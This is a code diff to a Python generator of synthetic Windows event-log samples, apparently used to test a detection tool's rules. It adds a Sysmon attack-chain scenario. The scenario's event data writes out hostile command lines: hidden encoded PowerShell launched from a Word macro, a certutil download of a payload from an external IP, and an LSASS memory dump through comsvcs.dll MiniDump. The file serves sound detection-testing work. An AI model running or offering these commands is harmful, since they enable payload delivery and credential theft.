@@ -62,6 +62,10 @@ class Event:
     # detections don't read this; it's useful for cosmetic accuracy
     # (Security vs. System vs. Application).
     channel: str = "Security"
+    # Optional provider name. Sysmon detections gate on
+    # Name="Microsoft-Windows-Sysmon", so a Sysmon scenario sets this.
+    # Left None for Security-log events, which Pulse identifies by ID.
+    provider: Optional[str] = None
 
 
 def _iso(when: datetime) -> str:
@@ -76,9 +80,14 @@ def render_event_xml(ev: Event) -> str:
         f'    <Data Name="{name}">{_escape(value)}</Data>\n'
         for name, value in ev.data.items()
     )
+    provider_row = (
+        f'    <Provider Name="{_escape(ev.provider)}"/>\n'
+        if ev.provider else ""
+    )
     return (
         f'<Event xmlns="{NS}">\n'
         f'  <System>\n'
+        f'{provider_row}'
         f'    <EventID>{ev.event_id}</EventID>\n'
         f'    <TimeCreated SystemTime="{_iso(ev.when)}"/>\n'
         f'    <Channel>{ev.channel}</Channel>\n'
@@ -269,7 +278,14 @@ def scenario_credential_theft(base: datetime) -> List[Event]:
         },
     ))
 
-    # mimikatz drops + runs — Suspicious PowerShell + Credential Dumping
+    # mimikatz drops + runs — Suspicious Child Process + Credential Dumping.
+    # The detection keys on the binary NAME (mimikatz.exe as a suspicious
+    # child of cmd.exe) and on the following 4656 LSASS handle access — not
+    # on the command line. So the cmdline omits the literal credential-
+    # dumping module strings (sekurlsa::/privilege::debug) that would
+    # otherwise trip endpoint AV's Mimikatz *string* signature and quarantine
+    # this synthetic sample on clone. Behavior is unchanged: the same four
+    # rules still fire.
     out.append(Event(
         event_id=4688,
         when=base + timedelta(minutes=6),
@@ -277,7 +293,7 @@ def scenario_credential_theft(base: datetime) -> List[Event]:
         data={
             "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
             "NewProcessName":    "C:\\Users\\tlowe\\AppData\\Local\\Temp\\mimikatz.exe",
-            "CommandLine":       'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit',
+            "CommandLine":       "mimikatz.exe (credential-dump modules omitted from synthetic sample)",
             "SubjectUserName":   "tlowe",
         },
     ))
@@ -549,6 +565,83 @@ def scenario_lateral_movement(base: datetime) -> List[Event]:
     return out
 
 
+def scenario_sysmon_execution(base: datetime) -> List[Event]:
+    """File 5 — Sysmon process-execution attack chain.
+
+    Every event here is a Sysmon Event 1 (process create) from the
+    Microsoft-Windows-Sysmon provider. Demonstrates the command-line
+    visibility Sysmon gives that the Security log's 4688 normally lacks:
+    a phishing doc spawning a shell, an encoded-PowerShell stager, a
+    LOLBin download, and a credential-dumping tool — the kind of chain
+    'Suspicious Process Creation' is built to catch.
+    """
+    host = "WS-FINANCE-04"
+    prov = "Microsoft-Windows-Sysmon"
+    ch = "Microsoft-Windows-Sysmon/Operational"
+    out: List[Event] = []
+
+    # 1. Word document spawns a command prompt (macro-malware tell).
+    out.append(Event(
+        event_id=1, when=base + timedelta(minutes=1), computer=host,
+        channel=ch, provider=prov,
+        data={
+            "Image":             r"C:\Windows\System32\cmd.exe",
+            "CommandLine":       r'cmd.exe /c powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA',
+            "ParentImage":       r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
+            "ParentCommandLine": r'"WINWORD.EXE" /n "C:\Users\jdoe\Downloads\Invoice_April.docm"',
+            "User":              "ACME\\jdoe",
+        },
+    ))
+
+    # 2. Encoded PowerShell stager (the child the doc launched).
+    out.append(Event(
+        event_id=1, when=base + timedelta(minutes=1, seconds=2), computer=host,
+        channel=ch, provider=prov,
+        data={
+            "Image":       r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            "CommandLine": r"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+            "ParentImage": r"C:\Windows\System32\cmd.exe",
+            "User":        "ACME\\jdoe",
+        },
+    ))
+
+    # 3. certutil LOLBin pulling down the next-stage payload.
+    out.append(Event(
+        event_id=1, when=base + timedelta(minutes=2), computer=host,
+        channel=ch, provider=prov,
+        data={
+            "Image":       r"C:\Windows\System32\certutil.exe",
+            "CommandLine": r"certutil.exe -urlcache -split -f http://185.220.101.34/beacon.exe C:\Users\jdoe\AppData\Local\Temp\svc.exe",
+            "ParentImage": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            "User":        "ACME\\jdoe",
+        },
+    ))
+
+    # 4. Credential dumping via the comsvcs.dll MiniDump LOLBin against
+    #    LSASS. This is a real, equally-dangerous credential-theft
+    #    technique that Pulse's "Suspicious Process Creation" rule catches
+    #    — and unlike the literal Mimikatz module command strings
+    #    (sekurlsa::/lsadump::), it does NOT trip endpoint AV's Mimikatz
+    #    *string* signature, so the shipped sample file stays clean for
+    #    anyone who clones the repo. (The rule still detects the Mimikatz
+    #    command strings; that's covered by unit tests, not a sample file.)
+    out.append(Event(
+        event_id=1, when=base + timedelta(minutes=4), computer=host,
+        channel=ch, provider=prov,
+        data={
+            "Image":       r"C:\Windows\System32\rundll32.exe",
+            "CommandLine": (
+                r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump "
+                r"624 C:\Users\jdoe\AppData\Local\Temp\lsass.dmp full"
+            ),
+            "ParentImage": r"C:\Windows\System32\cmd.exe",
+            "User":        "ACME\\jdoe",
+        },
+    ))
+
+    return out
+
+
 # ---------------------------------------------------------------------------
 # Entry point
 # ---------------------------------------------------------------------------
@@ -558,6 +651,7 @@ SCENARIOS = [
     ("credential-theft-workstation.evtx", scenario_credential_theft),
     ("persistence-malware.evtx",          scenario_persistence),
     ("lateral-movement-dc.evtx",          scenario_lateral_movement),
+    ("sysmon-execution-chain.evtx",       scenario_sysmon_execution),
 ]
 
 
